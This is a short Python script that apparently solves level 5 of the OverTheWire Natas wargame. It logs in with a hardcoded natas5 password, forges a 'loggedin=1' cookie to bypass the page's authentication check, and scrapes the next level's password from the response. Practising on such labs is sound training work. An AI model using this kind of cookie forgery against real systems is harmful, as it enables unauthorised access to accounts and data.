import requests
import re

username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

url = 'http://{}.natas.labs.overthewire.org'.format(username)
r = requests.get(url, auth=(username, password), cookies={"loggedin": "1" })
content = r.text


print("the password for next level = ", str(re.findall("The password for natas6 is (.*)<", content)))
